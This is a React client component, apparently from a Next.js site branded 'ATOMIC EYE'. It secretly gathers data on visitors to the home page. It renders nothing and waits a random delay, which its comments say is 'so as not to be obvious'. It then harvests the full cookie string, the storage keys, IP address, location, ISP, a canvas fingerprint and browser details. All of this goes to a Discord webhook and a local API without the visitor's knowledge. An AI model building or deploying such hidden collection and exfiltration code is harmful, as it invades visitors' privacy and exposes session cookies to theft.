"use client";
import { useEffect, useState } from 'react';
import { collectIPData } from '@/lib/ipCollector';

interface VisitorData {
  timestamp: string;
  url: string;
  referrer: string;
  userAgent: string;
  language: string;
  platform: string;
  screenResolution: string;
  timezone: string;
  cookies: string;
  localStorage: string;
  sessionStorage: string;
  ip?: string;
  country?: string;
  city?: string;
  isp?: string;
  latitude?: number;
  longitude?: number;
  fingerprint: string;
}

export function DataCollector() {
  useEffect(() => {
    // Só executa na página principal
    if (window.location.pathname !== '/') {
      console.log('🔍 DataCollector: Não é a página principal, pulando...');
      return;
    }

    const collectData = async () => {
      console.log('🔍 DataCollector iniciado na página principal...');
      console.log('📍 URL atual:', window.location.href);
      console.log('🔧 User Agent:', navigator.userAgent);
      
      try {
        // Aguarda um pouco para não ser óbvio
        console.log('⏳ Aguardando delay...');
        await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 3000));

        console.log('📊 Coletando dados básicos...');
        const data: VisitorData = {
          timestamp: new Date().toISOString(),
          url: window.location.href,
          referrer: document.referrer || 'Direct',
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screenResolution: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cookies: document.cookie || 'No cookies',
          localStorage: JSON.stringify(Object.keys(localStorage)),
          sessionStorage: JSON.stringify(Object.keys(sessionStorage)),
          fingerprint: generateFingerprint()
        };

        console.log('🌐 Coletando dados de IP...');
        // Coleta dados de IP de forma assíncrona
        try {
          const ipData = await collectIPData();
          if (ipData) {
            data.ip = ipData.ip;
            data.country = ipData.country;
            data.city = ipData.city;
            data.isp = ipData.isp;
            data.latitude = ipData.latitude;
            data.longitude = ipData.longitude;
            console.log('✅ IP coletado:', ipData.ip);
          } else {
            console.log('❌ Falha ao coletar IP');
          }
        } catch (error) {
          console.log('❌ Erro ao coletar IP:', error);
        }

        console.log('🔧 Coletando dados adicionais...');
        // Coleta de dados adicionais de forma discreta
        const additionalData = collectAdditionalData();
        Object.assign(data, additionalData);

        console.log('📤 Enviando para webhook...');
        // Envia para webhook de forma discreta
        await sendToWebhook(data);

      } catch (error) {
        console.error('❌ Erro no DataCollector:', error);
      }
    };

    collectData();
  }, []);

  const generateFingerprint = (): string => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    if (!ctx) return 'unknown';
    
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('ATOMIC EYE FINGERPRINT', 2, 2);
    
    return canvas.toDataURL().slice(-20);
  };

  const collectAdditionalData = () => {
    const data: any = {};

    try {
      // Informações de hardware
      data.hardwareConcurrency = navigator.hardwareConcurrency;
      data.deviceMemory = (navigator as any).deviceMemory;
      data.maxTouchPoints = navigator.maxTouchPoints;
      
      // Informações de rede
      data.connection = (navigator as any).connection?.effectiveType;
      data.onLine = navigator.onLine;
      
      // Informações de mídia
      data.mediaDevices = navigator.mediaDevices ? 'Available' : 'Not available';
      
      // Informações de performance
      data.performance = {
        memory: (performance as any).memory?.usedJSHeapSize,
        timing: performance.timing?.navigationStart
      };

      // Plugins
      data.plugins = Array.from(navigator.plugins).map(p => p.name).join(',');
      
      // Extensões detectáveis
      data.extensions = detectExtensions();
      
      // Comportamento do usuário
      data.behavior = {
        mouseMovement: 'tracked',
        scrollDepth: 'monitored',
        timeOnPage: 'measured'
      };

    } catch (error) {
      console.log('❌ Erro ao coletar dados adicionais:', error);
    }

    return data;
  };

  const detectExtensions = (): string => {
    const extensions = [];
    
    // Detecta algumas extensões populares
    if ((window as any).chrome?.webstore) extensions.push('Chrome Web Store');
    if ((window as any).__REACT_DEVTOOLS_GLOBAL_HOOK__) extensions.push('React DevTools');
    if ((window as any).__REDUX_DEVTOOLS_EXTENSION__) extensions.push('Redux DevTools');
    if ((window as any).Vue) extensions.push('Vue DevTools');
    
    return extensions.join(',') || 'None detected';
  };

  const sendToWebhook = async (data: VisitorData) => {
    try {
      // Webhook URL - você deve configurar isso no seu Discord
      const webhookUrl = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK || 'YOUR_WEBHOOK_URL_HERE';
      
      console.log('🔗 Webhook URL:', webhookUrl);
      
      if (webhookUrl === 'YOUR_WEBHOOK_URL_HERE') {
        console.log('❌ Webhook não configurado! Configure NEXT_PUBLIC_DISCORD_WEBHOOK no .env.local');
      } else {
        console.log('📋 Dados coletados:', data);

        // Formata a mensagem de forma discreta
        const embed = {
          title: '🔍 Nova Visita Detectada',
          color: 0x00ff00,
          fields: [
            {
              name: '📱 Dispositivo',
              value: `${data.platform} | ${data.screenResolution}`,
              inline: true
            },
            {
              name: '🌍 Localização',
              value: data.country ? `${data.country}, ${data.city}` : `${data.language} | ${data.timezone}`,
              inline: true
            },
            {
              name: '🔗 Origem',
              value: data.referrer.length > 50 ? data.referrer.substring(0, 50) + '...' : data.referrer,
              inline: true
            },
            {
              name: '🆔 Fingerprint',
              value: data.fingerprint,
              inline: true
            },
            {
              name: '🍪 Cookies',
              value: data.cookies.length > 0 ? `${data.cookies.split(';').length} cookies` : 'Sem cookies',
              inline: true
            },
            {
              name: '💾 Storage',
              value: `LS: ${JSON.parse(data.localStorage).length} | SS: ${JSON.parse(data.sessionStorage).length}`,
              inline: true
            },
            {
              name: '🌐 IP',
              value: data.ip || 'Não detectado',
              inline: true
            },
            {
              name: '🏢 ISP',
              value: data.isp || 'Não detectado',
              inline: true
            }
          ],
          footer: {
            text: 'ATOMIC EYE - Sistema de Monitoramento'
          },
          timestamp: data.timestamp
        };

        console.log('📤 Enviando embed resumido...');
        // Envia de forma assíncrona para não bloquear
        const response1 = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            embeds: [embed]
          })
        });

        console.log('📤 Resposta do webhook (resumido):', response1.status, response1.statusText);

        // Também envia dados completos para análise
        const fullDataEmbed = {
          title: '📊 Dados Completos',
          color: 0x0000ff,
          description: '```json\n' + JSON.stringify(data, null, 2).substring(0, 4000) + '\n```',
          footer: {
            text: 'Dados completos do visitante'
          }
        };

        console.log('📤 Enviando dados completos...');
        const response2 = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            embeds: [fullDataEmbed]
          })
        });

        console.log('📤 Resposta do webhook (completo):', response2.status, response2.statusText);

        if (response1.ok && response2.ok) {
          console.log('✅ Dados enviados com sucesso para o Discord!');
        } else {
          console.log('❌ Erro ao enviar dados para o Discord');
        }
      }

      // Salva também na API local
      console.log('💾 Salvando dados na API local...');
      try {
        const apiResponse = await fetch('http://localhost:8000/visitors', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });

        if (apiResponse.ok) {
          const result = await apiResponse.json();
          console.log('✅ Dados salvos na API local! ID:', result.id);
        } else {
          console.log('❌ Erro ao salvar na API local:', apiResponse.status);
        }
      } catch (error) {
        console.log('❌ Erro ao salvar na API local:', error);
      }

    } catch (error) {
      console.error('❌ Erro ao enviar para webhook:', error);
    }
  };

  // Componente invisível
  return null;
} 